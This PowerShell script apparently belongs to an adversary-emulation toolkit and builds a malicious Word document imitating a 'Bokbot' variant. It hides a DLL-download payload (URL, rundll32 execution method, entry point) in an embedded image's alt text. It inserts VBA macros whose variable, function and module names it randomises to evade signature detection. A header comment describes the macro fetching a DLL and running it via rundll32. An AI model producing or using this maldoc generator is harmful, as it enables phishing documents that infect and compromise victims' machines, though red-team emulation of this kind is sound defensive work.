Import-Module $PSScriptRoot\..\..\internals\utils.psm1
<#
Bokbot Variant 091520
CreateObject("Microsoft.XMLHTTP") downloads a DLL (traditionally renamed as a .cab on webserver)
Saves in C:\programdata as 'ebf45.hello'
executed with rundll32 with EntryPoint to be specified in payloads.txt
#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )
    #Initial setup of worddoc
    SetAuthor
    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false
    $fname = "$PSScriptRoot\Doc1.docm"
    $wdDoc = $wdApp.documents.open($fname)
    <#
    Protected.jpg is installed into the WordDoc as $img.
    $img.Title is an alt text field that holds the payload for the doc.
    The payload is in the textfile payload.txt and has three parts:
      Execution method for the dll
      URL of webhost for the dll
      EntryPoint for dll execution

    These 3 parts are built together with a '111111111' delimiter and installed into img.Title
    #>
    $img = $wdDoc.Shapes.AddPicture("$PSScriptRoot\protected.jpg")
    [string[]]$payload_array = Get-Content -Path "$PSScriptRoot\payloads.txt"
    $exec_method = $payload_array[0]
    $dll_url = $payload_array[1]
    $dll_entrypoint = $payload_array[2]
    $payload = "{0}1111111111{1}1111111111{2}" -f $exec_method, $dll_url, $dll_entrypoint
    $img.Title = "$payload"

    #Add 2 empty modules and 1 empty class module to the worddoc
    $vbaModule1 = $wdDoc.VBProject.VBComponents.Add(1)
    $vbaModule2 = $wdDoc.VBProject.VBComponents.Add(1)
    $vbaModule3 = $wdDoc.VBProject.VBComponents.Add(2)

    #BuildMacro populates variables macro1-3 to be inserted into the worddoc
    $macro1, $macro2, $macro3 = BuildMacro

    #macros 1,2,3 are added into the worddoc and renamed to random values
    $vbaModule1.CodeModule.AddFromString($macro1) | Out-Null
    RenameVBAModule -officeObject $wdDoc -from "Module1" -to $module1
    $vbaModule2.CodeModule.AddFromString($macro2) | Out-Null
    RenameVBAModule -officeObject $wdDoc -from "Module2" -to $module2
    $vbaModule3.CodeModule.AddFromString($macro3) | Out-Null
    RenameVBAModule -officeObject $wdDoc -from "Class1" -to $class1

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    }

    #garbage cleanup
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {
    #All 3 macros have been combined into a single file, macro.text
    #This was done for easier string replacement
    $macros = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")

    #Start variable name replacement here
    $var_counter = 1
    do {
        $this_var_name = "aVAR" + $var_counter + "a"
        $randName = RandTextAlpha -len 5
        if ($macros.contains($this_var_name)) {
            $macros = $macros -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    #Start function name replacement
    $var_counter = 1
    do {
        $this_var_name = "aFUNC" + $var_counter + "a"
        $randName = RandTextAlpha -len 5
        if ($macros.contains($this_var_name)) {
            $macros = $macros -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    #Generate random names for 2 VBA Modules and 1 Class Module here
    #Global vars so they are accessible outside of BuildMacro for main Build
    $global:module1 = RandTextAlpha -len 5
    $global:module2 = RandTextAlpha -len 5
    #Class module has one reference within macro.txt, that gets replaced now as a one-off
    $global:class1 = RandTextAlpha -len 5
    $macros = $macros -replace "aCLASS1a", $class1

    #After aVARa aFUNCa replacement, $macros is split into macro1, macro2, macro3
    [string[]]$blob = $macros
    $macros = $blob -split "CARL"
    $macro1 = $macros[0]
    $macro2 = $macros[1]
    $macro3 = $macros[2]

    #macro1, macro2, macro3 are returned as final product from BuildMacro
    return $macro1, $macro2, $macro3
}
